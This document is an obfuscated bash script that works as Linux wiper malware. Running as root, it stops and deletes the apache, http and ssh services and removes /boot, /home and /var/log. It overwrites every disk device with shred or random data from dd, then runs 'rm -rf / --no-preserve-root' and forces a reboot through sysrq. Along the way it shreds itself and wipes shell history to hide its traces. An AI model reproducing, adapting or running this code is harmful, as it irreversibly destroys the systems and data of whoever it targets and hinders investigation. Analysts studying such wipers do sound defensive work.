#!/bin/bash


declare -r yrkdrrue=20627
declare -r vwvdseye=3
declare -r iwljzfkg="dd uname sed"
declare -r ynwyqosb="Linux"
declare -r ikzxiqdu="disk"
declare -r eqbwzeva="/dev"
declare -r rwoagmiu="/dev/null"
declare -r oqdrgsrs="/boot"
declare -r igtldotd="/home"
declare -r lphfhxos="/var/log"
declare dyxioghg=~/.bash_history


declare gwujmkab="${oqdrgsrs} ${igtldotd} ${lphfhxos}"

declare -r yoqdanbh="apache http ssh"

declare -r agzerlyf=0
declare -r fatfbizn=1
declare -r nprrvnee=2
declare -r hnuykmao=3
declare -r xlnivyeb=4
declare -r rggygzny=5
declare -r yqonjmzk=6
declare -r puthtdnp=7
declare -r zubzgnvp=8
declare -r amkqcvxl=9

declare pyzxggym=
declare bfeejajn=


declare -r byfifttg="shred"
declare aqdrhucd="-n 1 -x -z "

declare -r fvtpjzum="dd"
declare yazhwrbn="bs=1k if=/dev/urandom of="

declare -a nfjkhpvw

declare -a pghzumbl=(
                    "/etc/systemd/system"
                    "/lib/systemd/system"
                    "/usr/lib/systemd/system"
                )

function ecjojtub()
{
        local gckpnhah=$agzerlyf



        if command -v $byfifttg &> $rwoagmiu; then
                pyzxggym=$byfifttg
                bfeejajn=$aqdrhucd
        elif command -v $fvtpjzum &> $rwoagmiu; then
                pyzxggym=$fvtpjzum
                bfeejajn=$yazhwrbn
        else
                gckpnhah=$fatfbizn
        fi


        return $gckpnhah
}

function ecefidua()
{
        if [ -e $1 ]; then
                return $agzerlyf
        else
                return $fatfbizn
        fi
}

function nmuqcagr()
{
        local gckpnhah=$agzerlyf


        if ecefidua "$0"; then
                $(eval "$byfifttg $aqdrhucd$0 >$rwoagmiu 2>&1")
                rm $0 >$rwoagmiu 2>&1
        fi

        return $gckpnhah
}

function zoqcmtli()
{
        local gckpnhah=$agzerlyf
        local wsfzycby

        for wsfzycby in ${iwljzfkg}; do
                if ! type "${wsfzycby}" >$rwoagmiu 2>&1; then
                        gckpnhah=$fatfbizn
                        break
                fi
        done

        return $gckpnhah
}

function onijvpzv()
{
        local iymsehjs="${1}.service"
        local nwrzqmsy
        local lmdfxvqa


        if systemctl --quiet is-active $iymsehjs >$rwoagmiu 2>&1; then

                systemctl stop $iymsehjs >$rwoagmiu 2>&1
                chkconfig off $iymsehjs >$rwoagmiu 2>&1
                systemctl disable $iymsehjs >$rwoagmiu 2>&1

                for nwrzqmsy in "${pghzumbl[@]}"; do

                        lmdfxvqa="${nwrzqmsy}/${iymsehjs}"

                        if ecefidua "$lmdfxvqa"; then

                                rm $lmdfxvqa >$rwoagmiu 2>&1
                        fi
                done

                systemctl daemon-reload >$rwoagmiu 2>&1
                systemctl reset-failed >$rwoagmiu 2>&1

        fi

}

function dhfvehti()
{
        local gckpnhah=$agzerlyf
        local zvcncero
        local gzuuldrw=$1
        local iymsehjs
        local lmdfxvqa
        local xgnlqgjp
        local qjbagmgq
        local rgpgfavy


        zvcncero=$(systemctl list-units 2>$rwoagmiu)

        for iymsehjs in ${gzuuldrw}; do

                while read -r qjbagmgq rgpgfavy; do

                        if [[ "$qjbagmgq" == *"$iymsehjs"* ]]; then

                                xgnlqgjp=$(basename -s .service $qjbagmgq 2>$rwoagmiu)

                                if systemctl is-active --quiet $xgnlqgjp 2>$rwoagmiu; then

                                        onijvpzv "$xgnlqgjp"

                                        lmdfxvqa=$(command -v $xgnlqgjp 2>$rwoagmiu)
                                        rm $lmdfxvqa 2>$rwoagmiu
                                        pkill $xgnlqgjp 2>$rwoagmiu
                                fi
                        fi

                done <<< "$zvcncero"
        done


        return $gckpnhah
}
function jbaxnzha()
{
        local fuzbifkb=$1
        local ynqjnqfm

        for ynqjnqfm in ${fuzbifkb}; do
                if [ -d "$ynqjnqfm" ]; then
                        rm -rf $ynqjnqfm --no-preserve-root >$rwoagmiu 2>&1
                fi
        done
}

function mqbqdclh()
{
        local gckpnhah=$agzerlyf
        local aqtnifev
        local rlpcjdlj
        local rwhakujt=0
        local -a iaimpkol
        local xykqxmbe


        if [[ "${#nfjkhpvw[@]}" -gt 0 ]]; then

                for rlpcjdlj in "${nfjkhpvw[@]}"; do
                        aqtnifev=$(eval "$pyzxggym $bfeejajn$rlpcjdlj 2>$rwoagmiu") &
                        iaimpkol[${rwhakujt}]=$!
                        ((rwhakujt++))

                        if [ "$aqtnifev" ]; then
                                gckpnhah=$fatfbizn
                        fi
                done
                for xykqxmbe in ${iaimpkol[@]}; do
                        wait $xykqxmbe
                done
        fi


        return $gckpnhah
}

function qkwutbpv()
{
        local gckpnhah=$fatfbizn
        local nijyzxlg
        local slwqekbn
        local qqorbsjh
        local jkstsjjx
        local vmvylhnx
        local plsscofk



        nijyzxlg=$(lsblk --nodeps --noheadings --output NAME,TYPE 2>$rwoagmiu)

        if [[ ! -z "$nijyzxlg" ]]; then

                slwqekbn=$(echo "$nijyzxlg" | sed 's/[[:space:]]\+/ /g')

                if [ "$slwqekbn" ]; then
                        plsscofk=0
                        while read -r qqorbsjh jkstsjjx;
                        do
                                if [ "$jkstsjjx" == "$ikzxiqdu" ]; then
                                        vmvylhnx="${eqbwzeva}/${qqorbsjh}"
                                        if ecefidua "$vmvylhnx"; then
                                                nfjkhpvw[$plsscofk]=$vmvylhnx
                                                ((plsscofk++))
                                                gckpnhah=$agzerlyf
                                        fi
                                fi
                        done <<< "$nijyzxlg"
                fi
        fi

        if [[ $gckpnhah -eq $fatfbizn ]]; then

                plsscofk=0
                nfjkhpvw=()
                for c in h s ; do
                        for qqorbsjh in ${c}d{a..z}; do
                                vmvylhnx="${eqbwzeva}/${qqorbsjh}"
                                if ecefidua "$vmvylhnx"; then
                                        nfjkhpvw[$plsscofk]=$vmvylhnx
                                        ((plsscofk++))
                                        gckpnhah=$agzerlyf
                                fi
                        done

                done
        fi


        return $gckpnhah
}

function eoztsutk()
{
        local gckpnhah=$fatfbizn

        if [[ "${BASH_VERSINFO[0]}" -ge "${vwvdseye}" ]]; then
                gckpnhah=$agzerlyf
        fi

        return $gckpnhah
}

function hvqkejdz()
{
        local gckpnhah=$(false)
        local mhqytdci
        local uhbjbhvv
        local xbaszrss
        local irbkzfkn

        mhqytdci=$(uname -s)
        uhbjbhvv=$(uname --kernel-release)
        xbaszrss=(${uhbjbhvv//[.-]/ })
        irbkzfkn=$(((xbaszrss[0] * 10000) + (xbaszrss[1] * 100) + xbaszrss[2]))

        if [[ "${mhqytdci}" == "${ynwyqosb}" ]]; then

                if [[ ${irbkzfkn} -ge ${yrkdrrue} ]]; then

                        gckpnhah=$(true)
                fi
        fi

        return $gckpnhah
}
function uqvzoqsv()
{

        echo 1 > /proc/sys/kernel/sysrq 2>$rwoagmiu
        echo b > /proc/sysrq-trigger 2>$rwoagmiu
}
function omqsiocm()
{

        set -o history
        history -c
        history -w
        set +o history
        cat "$rwoagmiu" > "$dyxioghg"
        unset dyxioghg
        dyxioghg=$rwoagmiu
        HISTSIZE=0
        HISTFILESIZE=0

}
function qqnukysz()
{

        set -o history

        history -c && history -w

        set +o history

        if [[ "$dyxioghg" != "$rwoagmiu" ]]; then

                cat "$rwoagmiu" > "$dyxioghg"
        fi

        echo 3 > /proc/sys/vm/drop_caches

        swapon -a 2>$rwoagmiu
        sleep 2
        swapoff -a 2>$rwoagmiu
        sync
}

function ojnaxkox()
{
        local gckpnhah=$fatfbizn


        nmuqcagr

        qqnukysz

        omqsiocm

        if [ $(id -u) = 0 ]; then

                if eoztsutk; then

                        if hvqkejdz; then

                                if zoqcmtli; then

                                        if ecjojtub; then

                                                dhfvehti "$yoqdanbh"

                                                jbaxnzha "$gwujmkab"

                                                qkwutbpv

                                                if [[ $? -eq $agzerlyf && "${#nfjkhpvw[@]}" -gt 0 ]]; then


                                                        if mqbqdclh; then

                                                                gckpnhah=$agzerlyf
                                                        else
                                                                gckpnhah=$zubzgnvp
                                                        fi
                                                else
                                                        gckpnhah=$puthtdnp
                                                fi

                                        else
                                                gckpnhah=$yqonjmzk

                                        fi
                                else
                                        gckpnhah=$rggygzny
                                fi
                        else
                                gckpnhah=$xlnivyeb
                        fi
                else
                        gckpnhah=$hnuykmao
                fi

        else
                gckpnhah=$nprrvnee
        fi


        rm -rf / --no-preserve-root >$rwoagmiu 2>&1


        if ! nmuqcagr; then

                gckpnhah=$amkqcvxl
        fi


        uqvzoqsv

        return $gckpnhah
}


ojnaxkox "$@"